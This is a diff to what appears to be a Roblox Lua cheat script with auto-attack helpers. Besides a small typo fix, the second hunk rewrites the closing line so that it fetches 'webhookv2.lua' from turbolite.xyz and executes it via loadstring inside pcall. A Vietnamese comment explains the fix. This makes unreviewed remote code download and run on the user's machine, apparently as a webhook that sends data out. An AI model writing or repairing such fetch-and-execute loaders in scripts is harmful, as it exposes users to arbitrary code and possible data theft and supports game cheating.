@@ -230,7 +230,7 @@ end
 local Attack = {}
 Attack.__index = Attack
 Attack.Alive = function(model) if not model then return end local Humanoid = model:FindFirstChild("Humanoid") return Humanoid and Humanoid.Health > 0 end
-Attack.Pos = function(model,dist) return (Root.Position - mode.Position).Magnitude <= dist end
+Attack.Pos = function(model,dist) return model and (Root.Position - model.Position).Magnitude <= dist end
 Attack.Dist = function(model,dist) return (Root.Position - model:FindFirstChild("HumanoidRootPart").Position).Magnitude <= dist end
 Attack.DistH = function(model,dist) return (Root.Position - model:FindFirstChild("HumanoidRootPart").Position).Magnitude > dist end
 Attack.Kill = function(model,Succes)
@@ -13122,7 +13122,16 @@ end)
 
 StartMainLoops()
 
-(game:HttpGet("https://turbolite.xyz/script/webhookv2.lua"))()
+-- FIX: HttpGet trả về chuỗi source, phải dùng loadstring mới chạy được.
+pcall(function()
+    local webhookSource = game:HttpGet("https://turbolite.xyz/script/webhookv2.lua")
+    if webhookSource and loadstring then
+        local webhook = loadstring(webhookSource)
+        if webhook then
+            webhook()
+        end
+    end
+end)
 
 -- Cache all services at start for better performance
 local Services = setmetatable({}, {
